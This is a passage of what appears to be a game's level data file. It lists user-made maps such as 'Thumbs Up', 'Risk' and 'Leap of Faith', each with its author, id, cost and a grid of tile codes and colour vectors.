ector(241,241,241),Vector(232,231,231),Vector(120,124,125),Vector(111,116,117),Vector(125,129,130),Vector(109,110,112),Vector(122,141,136),Vector(168,177,174),Vector(166,157,161),Vector(117,124,123),Vector(109,113,114),Vector(125,130,131),Vector(110,114,116),Vector(122,125,127),Vector(235,234,234),Vector(241,241,241),19,1,1,19,Vector(173,176,176),Vector(146,149,149),Vector(117,121,122),Vector(125,129,130),Vector(112,113,114),Vector(172,185,180),Vector(225,211,215),Vector(226,187,200),Vector(235,244,242),Vector(229,235,234),Vector(164,163,163),Vector(112,115,116),Vector(126,130,131),Vector(116,120,121),Vector(146,149,150),Vector(186,187,188),19,1,0,1,1,Vector(113,119,120),Vector(130,134,135),Vector(109,113,114),19,Vector(247,234,238),Vector(231,120,164),Vector(229,92,147),Vector(226,139,173),Vector(251,255,254),Vector(253,255,255),19,Vector(109,114,115),Vector(130,134,135),Vector(109,114,115),1,1,0,1,19,Vector(238,251,246),Vector(238,238,238),Vector(108,130,124),Vector(121,128,127),Vector(235,255,249),Vector(227,161,186),Vector(229,89,145),Vector(241,153,191),Vector(226,97,149),Vector(234,170,194),Vector(244,249,248),Vector(224,222,223),Vector(115,125,123),Vector(111,135,128),Vector(238,238,238),Vector(238,251,246),19,1,1,19,Vector(238,251,246),Vector(238,238,238),Vector(138,93,113),Vector(167,153,159),Vector(238,253,247),Vector(239,227,232),Vector(229,137,173),Vector(232,123,168),Vector(236,136,178),Vector(225,101,151),Vector(232,178,198),Vector(237,255,250),Vector(163,147,154),Vector(143,97,116),Vector(238,238,238),Vector(238,251,246),19,1,1,19,Vector(238,251,246),Vector(238,238,238),Vector(139,96,114),Vector(166,153,158),Vector(238,251,246),Vector(241,237,238),Vector(229,140,175),Vector(232,122,167),Vector(236,135,177),Vector(227,103,152),Vector(231,178,197),Vector(235,255,248),Vector(162,146,153),Vector(144,100,118),Vector(238,238,238),Vector(238,251,246),19,1,1,19,Vector(238,251,246),Vector(238,238,238),Vector(107,130,124),Vector(122,129,128),Vector(238,251,246),Vector(227,171,192),Vector(228,89,145),Vector(242,151,190),Vector(227,96,149),Vector(235,174,197),Vector(244,249,248),Vector(222,219,220),Vector(116,125,124),Vector(112,134,128),Vector(238,238,238),Vector(238,251,246),19,1,0,1,1,Vector(114,119,120),Vector(129,133,134),Vector(110,113,114),19,Vector(245,235,237),Vector(229,125,165),Vector(228,100,152),Vector(224,140,172),Vector(244,249,248),Vector(247,252,250),19,Vector(110,114,116),Vector(129,133,134),Vector(115,119,120),1,1,0,1,19,Vector(169,170,170),Vector(142,145,145),Vector(117,122,123),Vector(125,129,130),Vector(113,114,115),Vector(173,184,180),Vector(224,218,219),Vector(224,202,209),Vector(230,243,238),Vector(225,230,228),Vector(165,163,164),Vector(113,117,118),Vector(125,130,131),Vector(117,122,123),Vector(142,145,145),Vector(167,170,170),19,1,1,19,Vector(241,241,241),Vector(230,229,229),Vector(119,122,123),Vector(112,117,118),Vector(125,129,130),Vector(110,112,114),Vector(122,140,135),Vector(168,171,171),Vector(167,156,161),Vector(119,125,125),Vector(110,114,115),Vector(126,130,131),Vector(112,117,118),Vector(118,122,123),Vector(231,230,230),Vector(241,241,241),19,1,0,19,Vector(238,238,238),Vector(245,244,244),Vector(201,201,201),Vector(117,120,121),Vector(118,123,124),Vector(129,133,134),Vector(109,130,125),Vector(139,98,116),Vector(138,94,113),Vector(109,131,125),Vector(130,135,136),Vector(118,123,124),Vector(117,120,122),Vector(201,201,201),Vector(245,244,244),Vector(238,238,238),19,0,0,19,Vector(238,238,238),Vector(229,229,229),Vector(244,244,243),Vector(228,227,227),Vector(138,141,142),Vector(107,112,113),Vector(222,215,218),Vector(222,215,218),Vector(222,215,218),Vector(222,215,218),Vector(110,116,117),Vector(137,139,141),Vector(228,227,227),Vector(244,244,243),Vector(229,229,229),Vector(238,238,238),19,0,0,91,19,Vector(238,238,238),Vector(241,241,241),Vector(241,241,241),Vector(170,172,172),1,Vector(222,215,218),19,19,Vector(222,215,218),1,Vector(169,170,170),Vector(241,241,241),Vector(240,241,241),Vector(238,238,238),19,91,0,0,97,91,19,19,19,19,1,96,96,96,96,1,19,19,19,19,91,97,0,0,0,0,0,0,1,1,0,1,2,2,1,0,1,1,0,0,0,0,0]});
maps.push({name="Thumbs Up",author="NyaaaDoge",id="#1673349445",direction="left",cost=254,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,Vector(94,179,233),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,Vector(95,184,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,0,0,0,0,0,0,1,Vector(96,181,228),Vector(96,181,231),Vector(96,182,231),14,14,14,Vector(98,180,232),Vector(96,181,231),1,0,0,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(95,182,231),14,14,1,0,0,0,0,0,0,0,0,1,Vector(96,180,232),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,0,0,1,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,1,1,1,1,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,2,96,Vector(98,179,233),Vector(95,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,2,96,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,1,1,1,1,1,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,98,98,1,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),94,1,0,0,0,0,0,0,0,1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,Vector(96,181,231),Vector(96,181,231),1,93,1,0,0,0,0,0,0,0,0,0,1,97,1,99,97,1,97,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,0,0]});
maps.push({name="Thumbs Down",author="NyaaaDoge",id="#1673349469",direction="right",cost=290,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,76,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,0,0,0,1,76,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,0,0,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),76,76,76,1,0,0,0,0,0,0,0,0,0,0,1,Vector(204,93,95),Vector(204,93,95),76,76,76,Vector(204,93,95),Vector(204,94,96),Vector(204,93,95),1,0,0,0,0,0,0,0,0,0,0,1,76,76,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,1,0,0,0,0,0,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,1,1,1,0,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,0,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),96,2,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,Vector(203,93,96),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),96,2,1,Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,Vector(204,94,94),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),Vector(204,93,95),1,1,1,1,1,1,1,0,1,98,98,1,Vector(205,93,95),Vector(204,93,95),1,Vector(205,93,93),Vector(204,93,95),1,Vector(205,93,94),Vector(204,93,95),1,0,0,0,0,0,0,0,1,76,76,1,76,76,1,76,76,1,76,76,1,0,0,0,0,0,0,0,1,93,Vector(204,93,95),1,Vector(204,93,94),Vector(204,93,95),1,Vector(205,93,93),Vector(204,93,95),1,Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,1,94,1,Vector(204,93,95),Vector(204,93,95),1,Vector(205,93,93),Vector(204,93,95),1,Vector(204,93,95),Vector(204,93,95),1,0,0,0,0,0,0,0,0,0,1,0,1,99,1,99,99,1,97,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="fountain park",author="alli",id="#1673424164",direction="forward",cost=227,elevation=0,map=[0,0,0,0,0,0,6,9998,5,2,2,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,188,6,9998,5,9998,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,9998,5,9998,94,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,6,9998,5,9998,6,0,23,0,0,0,0,0,0,0,0,0,24,0,189,0,6,9998,5,9998,6,0,189,0,24,0,0,0,0,0,0,0,0,93,12,6,9998,5,5,5,9998,6,12,93,0,0,0,0,0,0,0,23,0,0,46,9998,5,9998,9998,9998,5,9998,46,0,0,23,0,0,0,0,0,0,0,6,9998,5,9998,6,6,6,9998,5,9998,6,0,0,0,0,0,0,24,0,6,9998,5,9998,6,65,65,65,6,9998,5,9998,6,0,24,0,0,0,0,9998,9998,5,9998,6,65,158,67,158,65,6,9998,5,9998,9998,0,0,0,24,0,6,9998,5,9998,6,65,67,65,67,65,6,9998,5,9998,6,0,24,0,0,0,9998,9998,5,9998,6,65,158,67,158,65,6,9998,5,9998,9998,0,0,0,0,23,0,6,9998,5,9998,6,65,65,65,6,9998,5,9998,6,0,23,0,0,0,0,0,0,6,9998,5,9998,6,6,6,9998,5,9998,6,0,0,0,0,0,0,0,24,0,0,46,9998,5,9998,9998,9998,5,9998,46,0,0,24,0,0,0,0,0,0,0,93,12,6,9998,5,5,5,9998,6,12,93,0,0,0,0,0,0,0,0,23,0,188,0,6,9998,5,9998,6,0,188,0,23,0,0,0,0,0,0,0,0,0,24,0,88,9998,5,9998,88,0,24,0,0,0,0,0,0,0,0,0,0,0,0,189,6,9998,5,9998,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,9998,5,2,2,9998,0,0,0,0,0,0,0,0]});
maps.push({name="Go inside and shoot",author="NyaaaDoge",id="#1673469621",direction="right",cost=385,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,14,14,1,0,0,1,1,1,1,1,1,90,9,114,114,1,0,0,0,0,14,14,1,1,1,90,114,114,114,114,3,9,9,114,114,1,0,0,0,0,14,14,96,142,142,91,85,114,88,114,3,9,9,114,114,1,0,0,0,0,14,14,96,142,142,91,114,114,114,114,3,9,9,114,96,91,1,0,0,0,13,13,1,1,1,1,1,1,1,0,90,9,9,114,96,91,95,1,0,0,12,12,1,131,90,99,9,24,1,0,9,9,85,114,96,91,95,2,0,0,12,12,1,99,109,109,92,24,95,24,9,9,9,114,96,91,95,2,0,0,11,11,1,90,109,109,9,24,1,24,92,9,9,114,114,1,1,1,0,0,11,11,1,109,109,90,9,24,1,24,92,9,9,113,113,1,0,0,0,0,10,10,1,99,109,109,92,24,95,24,9,9,90,113,113,1,0,0,0,0,10,10,1,131,109,99,9,24,1,0,9,9,9,112,112,1,0,0,0,0,9,9,1,1,199,199,199,1,1,1,0,9,9,112,112,1,0,0,0,0,9,9,195,195,109,109,109,109,96,93,199,9,9,112,112,1,0,0,0,0,85,9,195,195,109,109,109,109,96,90,199,132,9,111,111,1,0,0,0,0,0,9,1,1,1,109,109,109,96,93,199,9,9,111,111,1,0,0,0,0,0,96,9,94,1,109,109,109,1,1,0,90,9,110,110,1,1,0,0,0,0,0,94,0,0,1,109,109,9,9,9,9,9,110,110,98,97,1,0,0,0,0,0,0,0,1,109,109,9,9,9,9,9,110,90,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,0,0]});
maps.push({name="Target Practice",author="sivi",id="#1673482830",direction="forward",cost=270,elevation=0,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,90,114,114,114,0,0,115,115,115,115,115,115,115,115,115,115,115,1,0,1,114,114,114,114,0,0,115,115,115,115,115,115,115,115,115,115,127,1,1,1,114,114,114,114,0,0,1,199,199,199,199,199,199,1,1,0,0,0,1,1,90,114,114,114,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,114,114,114,114,0,0,0,1,0,0,0,1,0,0,1,187,115,0,1,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,1,1,199,189,1,1,90,114,114,114,0,0,0,0,0,1,0,0,0,0,111,0,91,115,1,1,114,114,114,114,0,0,0,1,0,0,0,1,0,0,1,1,127,1,1,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,1,187,115,0,1,1,90,114,114,114,0,0,0,0,0,1,0,0,0,0,1,0,0,0,1,1,114,114,114,114,0,0,0,1,0,0,0,1,0,0,1,187,115,0,1,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,1,1,199,189,1,1,90,114,114,114,0,0,0,0,0,1,0,0,0,0,119,0,91,115,1,1,114,114,114,114,0,0,0,1,0,0,0,1,0,0,1,1,115,1,1,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,1,1,115,1,0,1,90,114,114,114,0,0,0,0,0,0,0,0,0,0,1,1,116,1,0,1,1,95,95,1,117,117,117,117,117,117,117,117,117,117,117,117,117,1,0,0,1,114,114,1,90,93,93,93,93,93,93,93,93,90,1,1,1,1,0,0,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0]});
maps.push({name="Risk",author="Mini",id="#1673532361",direction="forward",cost=398,elevation=0,map=[0,0,19,2,2,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,19,19,19,0,0,0,19,19,95,19,19,19,19,19,90,0,0,0,0,90,19,93,19,0,0,0,19,19,95,90,19,19,100,19,90,0,0,0,0,90,19,19,19,0,0,0,19,19,95,19,19,19,19,19,90,0,0,0,0,9,9,184,90,65,9,9,19,9,9,9,9,90,184,184,9,0,0,0,0,9,9,184,65,65,90,9,19,9,90,90,65,9,184,184,9,0,0,0,0,9,9,184,9,9,9,9,19,9,9,65,65,9,184,184,9,0,0,0,0,148,9,184,9,9,94,9,19,19,148,9,94,9,184,184,90,0,0,0,0,18,9,184,9,9,9,9,19,19,18,65,65,9,184,184,9,0,0,0,0,9,90,184,9,65,90,9,185,185,9,90,65,9,184,184,9,0,0,0,0,9,184,184,9,65,90,9,185,185,9,90,65,9,184,90,9,0,0,0,0,9,184,184,9,65,65,18,19,19,9,9,9,9,184,9,18,0,0,0,0,90,184,184,9,94,9,148,19,19,9,94,9,9,184,9,148,0,0,0,0,9,184,184,9,65,65,9,9,19,9,9,9,9,184,9,9,0,0,0,0,9,184,184,9,65,90,90,9,19,9,90,65,65,184,9,9,0,0,0,0,9,184,184,90,9,9,9,9,19,9,9,65,90,184,9,9,0,0,0,0,90,19,19,19,19,19,95,19,19,0,0,0,19,19,19,90,0,0,0,0,90,19,100,19,19,90,95,19,19,0,0,0,19,93,19,90,0,0,0,0,90,19,19,19,19,19,95,19,19,0,0,0,19,19,19,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,2,2,19,0,0]});
maps.push({name="Mindscape",author="Mini",id="#1673635757",direction="forward",cost=358,elevation=0,map=[0,0,0,0,0,0,0,0,19,2,2,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,19,19,19,19,0,0,0,1,1,1,0,0,0,1,90,90,90,1,0,90,19,19,19,19,90,0,1,90,90,90,1,0,0,1,49,131,49,1,0,0,19,19,19,19,0,0,1,49,136,49,1,0,0,1,199,199,199,1,0,90,19,94,94,19,90,0,1,49,49,49,1,0,0,1,143,143,143,1,0,0,19,19,19,19,0,0,1,143,143,143,1,0,0,1,90,49,90,1,0,90,19,19,19,19,90,0,1,90,49,90,1,0,0,1,49,49,49,1,0,0,19,19,19,19,0,0,1,49,49,49,1,0,0,1,49,132,49,1,0,90,19,19,19,19,90,0,1,49,134,49,1,0,0,1,49,132,49,1,19,19,19,19,19,19,19,19,1,49,134,49,1,0,0,1,49,49,49,1,131,19,19,19,19,19,19,131,1,49,49,49,1,0,0,1,90,49,90,1,199,199,119,119,119,119,199,199,1,90,49,90,1,0,0,1,143,143,143,1,137,199,96,96,96,96,199,93,1,143,143,143,1,0,0,1,49,49,49,1,19,199,119,119,119,119,199,19,1,199,199,199,1,0,0,1,49,133,49,1,97,199,19,19,19,19,199,19,1,49,131,49,1,0,0,1,90,90,90,1,19,199,19,19,19,19,199,19,1,90,90,90,1,0,0,0,1,1,1,19,19,19,19,19,19,19,19,19,19,1,1,1,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,2,2,19,0,0,0,0,0,0,0,0]});
maps.push({name="Bloodaren",author="Mini",id="#1673635811",direction="forward",cost=444,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,86,24,24,75,24,90,24,86,24,24,24,24,90,24,24,24,24,24,0,0,24,24,24,24,86,24,24,24,75,90,24,24,24,94,24,24,24,24,0,0,24,90,0,0,0,0,0,0,0,0,1,24,86,75,90,24,75,24,0,0,75,24,0,0,0,0,0,0,0,1,76,76,24,24,24,24,24,90,0,0,24,24,0,0,0,0,0,0,1,76,24,76,76,24,90,75,94,24,0,0,24,86,0,0,0,0,0,1,76,76,76,76,76,76,24,86,24,75,0,0,24,24,0,0,0,0,1,76,24,76,76,76,76,76,76,24,24,24,0,0,90,75,0,0,0,1,76,76,76,76,148,76,76,24,76,1,75,24,0,0,24,24,0,0,1,76,24,76,76,24,76,76,76,76,1,0,24,24,0,0,24,90,0,1,76,76,76,76,24,76,76,24,76,1,0,0,24,24,0,0,24,24,1,76,24,76,76,148,76,76,76,76,1,0,0,0,24,86,0,0,24,24,24,76,76,76,76,76,76,24,76,1,0,0,0,0,90,24,0,0,24,24,75,24,76,76,76,76,76,76,1,0,0,0,0,0,24,75,0,0,90,93,86,24,24,76,76,24,76,1,0,0,0,0,0,0,24,90,0,0,24,24,24,24,75,24,76,76,1,0,0,0,0,0,0,0,24,86,0,0,24,24,75,24,24,24,24,1,0,0,0,0,0,0,0,0,24,24,0,0,75,86,90,24,93,86,24,24,24,24,24,90,24,24,86,24,24,24,0,0,24,24,24,24,75,24,24,24,90,24,86,75,24,24,24,24,90,75,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Escape",author="Mini",id="#1673637757",direction="forward",cost=274,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,5,0,0,0,0,0,0,0,0,0,9,10,10,10,90,199,0,0,0,5,5,6,6,6,6,7,7,7,0,9,9,10,10,10,13,93,199,0,0,0,5,6,6,6,6,7,7,7,7,9,9,199,10,13,13,90,199,0,0,0,199,199,199,199,199,199,199,7,7,9,199,199,10,13,13,0,0,20,143,143,20,0,0,0,0,0,199,199,7,9,199,10,10,13,0,0,20,90,54,54,90,20,0,0,0,11,11,199,8,8,199,10,13,11,32,33,54,54,94,94,54,54,33,32,11,11,10,199,8,8,199,10,11,11,32,33,54,54,94,94,54,54,33,32,11,13,10,199,8,8,199,11,11,0,0,0,20,90,54,54,90,20,0,0,13,10,10,199,9,7,199,199,0,0,0,0,0,20,143,143,20,0,0,13,13,10,199,199,9,7,7,199,199,199,199,199,199,199,0,0,0,199,90,13,13,10,199,9,9,7,7,7,7,6,6,6,6,5,0,0,0,199,93,13,10,10,10,9,9,0,7,7,7,6,6,6,6,5,5,0,0,0,199,90,10,10,10,9,0,0,0,0,0,0,0,0,0,5,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Leap of Faith",author="Mini",id="#1673638934",direction="forward",cost=104,elevation=6,map=[0,0,0,0,0,0,90,18,18,2,2,18,18,90,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,90,18,18,18,18,18,18,90,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,22,18,18,18,18,18,18,22,0,0,0,0,0,0,0,0,0,0,0,0,0,24,95,95,95,95,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,18,18,18,18,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,93,93,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,44,183,183,44,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,44,183,183,44,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,44,183,183,44,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,44,183,183,44,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,44,2,2,44,186,0,0,0,0,0,0,0]});
maps.push({name="Trade with health",author="NyaaaDoge",id="#1673680131",direction="forward",cost=282,elevation=4,map=[0,0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,7,7,7,9,9,9,9,9,9,7,7,7,0,0,0,0,0,0,0,1,51,51,51,97,51,51,51,51,97,51,51,51,1,0,0,0,0,0,1,51,45,45,51,1,51,94,94,51,1,51,45,45,51,1,0,0,0,0,1,51,47,47,16,16,16,16,16,16,16,16,47,47,51,1,0,0,0,0,1,33,49,49,24,93,24,24,24,24,93,24,49,49,33,1,0,0,0,0,1,33,51,51,44,44,44,76,76,44,44,44,51,51,33,1,0,0,0,0,1,33,51,33,44,44,44,76,76,44,44,44,33,51,33,1,0,0,0,0,1,33,51,33,44,76,76,76,76,76,76,44,33,51,33,1,0,0,0,0,1,33,51,33,44,76,76,76,76,76,76,44,33,51,33,1,0,0,0,0,1,33,51,33,44,44,44,76,76,44,44,44,33,51,33,1,0,0,0,0,1,33,51,51,44,44,44,76,76,44,44,44,51,51,33,1,0,0,0,0,1,33,33,33,33,35,35,35,35,35,35,33,33,33,33,1,0,0,0,0,0,1,1,1,33,33,33,33,33,33,33,33,1,1,1,0,0,0,0,0,0,0,0,0,1,1,113,96,96,113,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,96,2,2,96,1,0,0,0,0,0,0,0]});
maps.push({name="Blood Toll",author="ZpLit",id="#1673740546",direction="right",cost=226,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,7,7,1,8,8,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,6,6,1,9,9,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,5,5,1,10,10,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,95,95,1,11,11,11,0,0,0,0,14,14,14,14,0,0,0,0,0,0,95,95,1,11,11,11,0,0,0,14,14,14,14,14,189,1,1,189,0,0,5,5,5,1,11,11,11,12,13,14,14,14,14,14,22,76,76,22,14,93,5,5,5,1,11,11,11,12,13,14,14,14,14,14,22,76,76,22,14,14,0,5,5,5,1,11,11,12,13,14,14,14,14,14,188,1,1,188,14,14,0,5,5,5,5,1,1,1,1,1,1,1,1,1,1,14,14,14,14,88,0,0,5,5,5,5,5,6,7,8,9,10,11,12,13,14,14,14,14,2,0,0,0,5,5,5,5,6,7,8,9,10,11,12,13,14,14,14,14,2,0,0,0,0,5,5,5,6,7,8,9,10,11,12,13,14,14,14,14,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
